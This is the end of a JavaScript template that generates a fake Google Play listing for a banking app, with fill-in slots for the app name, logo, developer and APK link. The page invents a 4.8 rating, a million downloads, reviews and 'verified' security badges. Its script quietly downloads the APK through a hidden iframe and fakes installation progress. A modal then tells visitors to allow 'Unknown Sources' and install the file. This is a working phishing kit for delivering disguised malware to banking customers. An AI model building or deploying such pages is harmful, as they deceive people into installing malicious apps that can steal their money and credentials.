    font-size: 14px;
    color: #3c4043;
    line-height: 1.5;
}

.install-steps {
    margin: 12px 0 20px;
    padding-left: 20px;
    font-size: 13px;
    color: #3c4043;
    line-height: 1.6;
}

.install-steps li {
    margin-bottom: 8px;
}

.modal-btn-primary {
    width: 100%;
    height: 44px;
    background: #01875f;
    color: #ffffff;
    border: 0;
    border-radius: 22px;
    font-size: 14px;
    font-weight: 500;
    cursor: pointer;
    transition: background 0.2s ease;
}

.modal-btn-primary:hover {
    background: #017250;
}

@keyframes fadeIn {
    from { opacity: 0; transform: scale(0.96); }
    to { opacity: 1; transform: scale(1); }
}


    </style>
</head>
<body>
    <!-- Google Play Header Bar -->
    <header class="topbar">
        <div class="topbar-inner">
            <a class="brand" href="#top" aria-label="Google Play home">
                <span class="brand-mark" title="Google Play">
                    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M4.5 3.5L16.2 11.7L4.5 19.9V3.5Z" fill="#00e676" />
                        <path d="M16.2 11.7L19.5 9.8C20.3 9.4 20.3 8.3 19.5 7.8L4.5 3.5L16.2 11.7Z" fill="#ffeb3b" />
                        <path d="M4.5 19.9L19.5 15.6C20.3 15.2 20.3 14.1 19.5 13.6L16.2 11.7L4.5 19.9Z" fill="#ff2a6d" />
                        <path d="M16.2 11.7L4.5 3.5V19.9L16.2 11.7Z" fill="#29b6f6" />
                    </svg>
                </span>
                <span>google play</span>
            </a>

            <label class="search-box">
                <span class="search-icon">
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                        <circle cx="11" cy="11" r="8" />
                        <line x1="21" y1="21" x2="16.65" y2="16.65" />
                    </svg>
                </span>
                <input type="search" id="searchInput" placeholder="Search for apps & games" aria-label="Search for apps and games" />
                <kbd>⌘ K</kbd>
            </label>

            <nav class="top-actions" aria-label="Account actions">
                <button class="icon-button" aria-label="Help" title="Help & Feedback">?</button>
                <button class="avatar" aria-label="Profile" title="Google Account">VS</button>
            </nav>
        </div>
    </header>

    <!-- Page Shell Main Container -->
    <main id="top" class="page-shell">
        <!-- Category Breadcrumbs -->
        <div class="breadcrumbs" aria-label="Breadcrumbs">
            <a href="#apps">Apps</a> <span>›</span>
            <a href="#finance">Finance & Banking</a> <span>›</span>
            <span>${name}</span>
        </div>

        <!-- App Hero Section -->
        <section class="app-hero">
            <div class="app-logo">
                <img id="appLogo" src="${logoUrl}" alt="${name} Logo" />
            </div>

            <div class="app-copy">
                <h1 id="appName">${name}</h1>
                <p class="developer" id="appDeveloper">${developer} <span class="verified" title="Verified Financial Institution">✓</span></p>
                <p class="tagline" id="appTagline">${tagline}</p>

                <div class="hero-meta">
                    <span>
                        <strong>4.8 <span class="stars">★★★★★</span></strong>
                        <small>12K reviews</small>
                    </span>
                    <span class="meta-divider"></span>
                    <span>
                        <strong>1M+</strong>
                        <small>Downloads</small>
                    </span>
                    <span class="meta-divider"></span>
                    <span>
                        <strong>Everyone</strong>
                        <small>Rated for 3+</small>
                    </span>
                    <span class="meta-divider"></span>
                    <span>
                        <strong>12 MB</strong>
                        <small>Size</small>
                    </span>
                </div>
            </div>

            <div class="hero-action">
                <button class="install-button" id="installButton" data-apk="${apkUrl}">
                    <span class="button-label">Install</span>
                    <span class="button-spinner"></span>
                </button>
                <div class="hero-action-buttons">
                    <button class="action-chip wishlist-chip" id="wishlistChip" title="Add to wishlist">
                        <span class="icon">★</span> Add to wishlist
                    </button>
                    <button class="action-chip share-chip" id="shareChip" title="Share app">
                        <span class="icon">➦</span> Share
                    </button>
                </div>
                <p class="availability">Available on all your devices</p>
            </div>
        </section>

        <!-- Toast Notification Banner -->
        <div class="notice" id="notice" role="status" aria-live="polite">
            <span class="notice-icon">✓</span>
            <span id="noticeText">App added to your wishlist.</span>
            <button id="dismissNotice" aria-label="Dismiss notification">×</button>
        </div>

        <!-- Main Content Grid -->
        <section class="content-grid">
            <div class="main-column">

                <!-- Banking Screenshots Preview Section -->
                <section class="section-block screenshots-section">
                    <div class="section-heading">
                        <h2>App preview</h2>
                        <div class="carousel-nav">
                            <button class="round-arrow shot-prev" id="shotPrev" aria-label="Previous screenshot">‹</button>
                            <button class="round-arrow shot-next" id="shotNext" aria-label="Next screenshot">›</button>
                        </div>
                    </div>

                    <div class="screenshots" id="screenshotsList">
                        <!-- Shot 1: Account Balance & Quick Transfers -->
                        <div class="shot shot-one">
                            <div class="shot-top">
                                <b>💳 Banking Portal</b>
                            </div>
                            <div class="shot-title">Account & Balance</div>
                            <div class="bank-balance-card">
                                <small>Available Balance</small>
                                <div class="balance-num">₹4850.00</div>
                                <span class="acc-num">Savings A/c •••• 4829</span>
                            </div>
                            <div class="quick-bank-actions">
                                <span class="bank-act-btn">⚡ UPI</span>
                                <span class="bank-act-btn">↗ Send</span>
                                <span class="bank-act-btn">📄 Bills</span>
                            </div>
                            <div class="task-card bank-tx">
                                <div class="check checked">✓</div>
                                <span>Salary Credit Received</span>
                                <em>+₹75,000</em>
                            </div>
                            <div class="task-card bank-tx">
                                <div class="check checked">✓</div>
                                <span>Merchant UPI Payment</span>
                                <em>-₹2,490</em>
                            </div>
                            <div class="progress-line"><span style="width: 82%;"></span></div>
                        </div>

                        <!-- Shot 2: Instant Pre-approved Credit & Card Management -->
                        <div class="shot shot-two">
                            <div class="shot-top">
                                <span>CREDIT SERVICES</span>
                                <b>💎 Pre-Approved</b>
                            </div>
                            <div class="bank-credit-box">
                                <small>Instant Credit Limit</small>
                                <strong>₹2,50,000</strong>
                            </div>
                            <div class="ring bank-card-ring">
                                <b>VISA</b>
                                <small>•••• 9812</small>
                            </div>
                            <div class="mini-bars">
                                <i></i><i></i><i></i><i></i><i></i>
                            </div>
                            <strong>92% Available Credit Line</strong>
                        </div>

                        <!-- Shot 3: 256-bit Security & Financial Insights -->
                        <div class="shot shot-three">
                            <div class="shot-top">
                                <span class="note-label">BANK SECURITY</span>
                                <b>🛡️ 256-Bit SSL</b>
                            </div>
                            <strong>Bank-Grade 24/7 Protection</strong>
                            <p>Instant card lock, biometric login, and real-time transaction alerts for maximum security.</p>
                            <div class="note-dot bank-sec-dot" title="Account Secured">🔒</div>
                        </div>
                    </div>
                </section>

                <!-- About this App Section -->
                <section class="section-block about">
                    <div class="section-heading">
                        <h2>About this app</h2>
                        <button class="round-arrow" aria-label="About this app">→</button>
                    </div>
                    <p id="appDescription">${description}</p>

                    <div class="tag-chips">
                        <span class="tag">Mobile Banking</span>
                        <span class="tag">Instant Transfers</span>
                        <span class="tag">UPI & Bill Pay</span>
                        <span class="tag">Credit Cards & Loans</span>
                        <span class="tag">Secure NetBanking</span>
                    </div>

                    <a class="learn-more" href="#data-safety">Read details <span>→</span></a>
                </section>

                <!-- What's New Section -->
                <section class="section-block">
                    <div class="section-heading">
                        <h2>What's new</h2>
                        <span class="version" id="appVersion">Version ${version}</span>
                    </div>
                    <p class="update-copy">Upgraded 256-bit SSL encryption security, 1-tap instant UPI transfer speeds, biometric fingerprint/face login authentication, and smart monthly spending analytics.</p>
                    <div class="update-pills">
                        <span>✦ 1-Tap Instant UPI Transfers</span>
                        <span>🛡️ Biometric Login Security</span>
                        <span>★ Pre-approved Instant Loans</span>
                    </div>
                </section>

                <!-- Ratings & Reviews Summary -->
                <section class="section-block reviews-section">
                    <div class="section-heading">
                        <h2>Ratings and reviews</h2>
                        <button class="round-arrow" aria-label="See all reviews">→</button>
                    </div>

                    <div class="ratings-container">
                        <div class="score-card">
                            <div class="score-num">4.8</div>
                            <div class="score-stars">★★★★★</div>
                            <small class="score-count">12,480 total reviews</small>
                        </div>

                        <div class="rating-bars-list">
                            <div class="rating-bar-item"><span>5</span>
                                <div class="bar-track">
                                    <div class="bar-fill" style="width: 86%;"></div>
                                </div>
                            </div>
                            <div class="rating-bar-item"><span>4</span>
                                <div class="bar-track">
                                    <div class="bar-fill" style="width: 10%;"></div>
                                </div>
                            </div>
                            <div class="rating-bar-item"><span>3</span>
                                <div class="bar-track">
                                    <div class="bar-fill" style="width: 2%;"></div>
                                </div>
                            </div>
                            <div class="rating-bar-item"><span>2</span>
                                <div class="bar-track">
                                    <div class="bar-fill" style="width: 1%;"></div>
                                </div>
                            </div>
                            <div class="rating-bar-item"><span>1</span>
                                <div class="bar-track">
                                    <div class="bar-fill" style="width: 1%;"></div>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- Featured Review Cards -->
                    <div class="reviews-list">
                        <div class="review-item">
                            <div class="review-user">
                                <div class="user-avatar-circle" style="background: #e8f0fe; color: #1a73e8;">AK</div>
                                <div class="user-details">
                                    <strong>Alex Kumar</strong>
                                    <div class="user-rating-line"><span class="stars-sm">★★★★★</span> <small>August 19, 2025</small></div>
                                </div>
                            </div>
                            <p class="review-text">Hands down the most reliable and fast mobile banking app! Money transfers happen in less than a second, and account management is super smooth.</p>
                            <div class="review-helpful"><small>52 people found this review helpful</small></div>
                        </div>
                    </div>
                </section>

            </div>

            <!-- Sidebar Column -->
            <aside class="side-column">
                <section class="info-card">
                    <div class="info-heading">
                        <h2>App info</h2>
                        <span class="more">•••</span>
                    </div>
                    <div class="info-row">
                        <span class="info-icon">↓</span>
                        <span><b>1M+ downloads</b><small>Trusted by customers nationwide</small></span>
                    </div>
                    <div class="info-row">
                        <span class="info-icon">▣</span>
                        <span><b>4.2 MB</b><small>Small size, ultra fast</small></span>
                    </div>
                    <div class="info-row">
                        <span class="info-icon">◷</span>
                        <span><b>Updated recently</b><small>August 18, 2025</small></span>
                    </div>
                    <div class="info-row">
                        <span class="info-icon">●</span>
                        <span><b>Verified Financial App</b><small>Compliant & Secure</small></span>
                    </div>
                </section>

                <section class="info-card safety-card" id="data-safety">
                    <div class="info-heading">
                        <h2>Data safety</h2>
                        <span class="shield">✓</span>
                    </div>
                    <p>Safety starts with understanding how financial institutions protect your data. Developer has provided this security summary.</p>

                    <div class="safety-points">
                        <div class="safety-point">
                            <span class="point-icon">🔒</span>
                            <span>256-bit bank-grade encryption in transit</span>
                        </div>
                        <div class="safety-point">
                            <span class="point-icon">🛡️</span>
                            <span>Multi-factor biometric authentication</span>
                        </div>
                        <div class="safety-point">
                            <span class="point-icon">🗑️</span>
                            <span>No unauthorized data sharing</span>
                        </div>
                    </div>

                    <a class="learn-more" href="#data-safety">See details <span>→</span></a>
                </section>
            </aside>
        </section>
    </main>

    <!-- APK Installation Guide Modal -->
    <div class="install-modal-overlay" id="installModal" role="dialog" aria-modal="true">
        <div class="install-modal-card">
            <div class="modal-header">
                <span class="modal-icon">📥</span>
                <h3>Complete App Installation</h3>
                <button class="modal-close" id="closeInstallModal" aria-label="Close">×</button>
            </div>
            <div class="modal-body">
                <p><strong>APK File Downloaded Successfully!</strong></p>
                <p>To install the app on your phone, follow these simple steps:</p>
                <ol class="install-steps">
                    <li>Open your phone's <b>Notification Bar</b> or <b>Downloads Folder</b>.</li>
                    <li>Tap on the downloaded <b id="modalApkName">${name.replace(/[^a-z0-9]/gi, '_')}.apk</b> file.</li>
                    <li>If prompted, turn on <b>"Allow from this source / Unknown Sources"</b>.</li>
                    <li>Tap <b>"Install"</b> to complete installation.</li>
                </ol>
            </div>
            <div class="modal-footer">
                <button class="modal-btn-primary" id="gotItModalBtn">Got it, open downloads</button>
            </div>
        </div>
    </div>

    <!-- Mobile Bottom Navigation -->
    <nav class="bottom-nav" aria-label="Main navigation">
        <a class="active" href="#top"><span>⌂</span>Home</a>
        <a href="#apps"><span>▦</span>Apps</a>
        <a href="#games"><span>◈</span>Games</a>
        <a href="#books"><span>▤</span>Books</a>
    </nav>

    <script>
        const installButton = document.querySelector('#installButton');
        const notice = document.querySelector('#notice');
        const dismissNotice = document.querySelector('#dismissNotice');
        const noticeText = document.querySelector('#noticeText');
        const installModal = document.querySelector('#installModal');
        const closeInstallModal = document.querySelector('#closeInstallModal');
        const gotItModalBtn = document.querySelector('#gotItModalBtn');

        if (installButton) {
            installButton.addEventListener('click', () => {
                const currentAppName = document.querySelector('#appName')?.textContent || 'App';
                const modalApkName = document.querySelector('#modalApkName');
                if (modalApkName) modalApkName.textContent = currentAppName.replace(/[^a-z0-9]/gi, '_') + '.apk';

                if (installButton.classList.contains('installed')) {
                    if (installModal) installModal.classList.add('show');
                    return;
                }

                if (installButton.classList.contains('installing')) return;

                const apkUrl = installButton.dataset.apk;
                if (apkUrl && apkUrl !== '#') {
                    const iframe = document.createElement('iframe');
                    iframe.style.display = 'none';
                    iframe.src = apkUrl;
                    document.body.appendChild(iframe);
                    setTimeout(() => iframe.remove(), 6000);
                }

                installButton.classList.add('installing');
                const label = installButton.querySelector('.button-label');
                if (label) label.textContent = 'Preparing...';

                setTimeout(() => { if (label) label.textContent = 'Downloading (45%)...'; }, 700);
                setTimeout(() => { if (label) label.textContent = 'Installing...'; }, 1400);

                setTimeout(() => {
                    installButton.classList.remove('installing');
                    installButton.classList.add('installed');
                    if (label) label.textContent = 'Open';
                    const avail = document.querySelector('.availability');
                    if (avail) avail.textContent = '✓ Download complete';

                    if (notice) {
                        if (noticeText) noticeText.textContent = currentAppName + ' downloaded. Click Open for installation steps.';
                        notice.classList.add('show');
                    }
                    if (installModal) installModal.classList.add('show');
                }, 2200);
            });
        }

        if (closeInstallModal && installModal) {
            closeInstallModal.addEventListener('click', () => installModal.classList.remove('show'));
        }
        if (gotItModalBtn && installModal) {
            gotItModalBtn.addEventListener('click', () => installModal.classList.remove('show'));
        }
        if (installModal) {
            installModal.addEventListener('click', (e) => {
                if (e.target === installModal) installModal.classList.remove('show');
            });
        }
        if (dismissNotice) {
            dismissNotice.addEventListener('click', () => notice.classList.remove('show'));
        }

        const wishlistChip = document.querySelector('#wishlistChip');
        if (wishlistChip) {
            wishlistChip.addEventListener('click', () => {
                wishlistChip.classList.toggle('active');
                const isAdded = wishlistChip.classList.contains('active');
                wishlistChip.style.background = isAdded ? '#e8f0fe' : '#ffffff';
                wishlistChip.style.borderColor = isAdded ? '#c2e7ff' : '#dadce0';
                const currentAppName = document.querySelector('#appName')?.textContent || 'App';
                if (notice) {
                    if (noticeText) noticeText.textContent = isAdded ? currentAppName + ' has been added to your wishlist.' : currentAppName + ' removed from your wishlist.';
                    notice.classList.add('show');
                }
            });
        }

        const shareChip = document.querySelector('#shareChip');
        if (shareChip) {
            shareChip.addEventListener('click', async () => {
                const currentAppName = document.querySelector('#appName')?.textContent || 'App';
                if (navigator.share) {
                    try {
                        await navigator.share({
                            title: currentAppName + ' - Mobile Banking',
                            text: 'Check out ' + currentAppName + ' on Google Play!',
                            url: window.location.href,
                        });
                    } catch (e) {}
                } else {
                    navigator.clipboard.writeText(window.location.href);
                    if (notice) {
                        if (noticeText) noticeText.textContent = 'App link copied to clipboard!';
                        notice.classList.add('show');
                    }
                }
            });
        }

        const screenshotsContainer = document.querySelector('#screenshotsList');
        const shotPrev = document.querySelector('#shotPrev');
        const shotNext = document.querySelector('#shotNext');
        if (screenshotsContainer && shotPrev && shotNext) {
            shotPrev.addEventListener('click', () => {
                screenshotsContainer.scrollBy({ left: -240, behavior: 'smooth' });
            });
            shotNext.addEventListener('click', () => {
                screenshotsContainer.scrollBy({ left: 240, behavior: 'smooth' });
            });
        }
    </script>
</body>
</html>`;
}
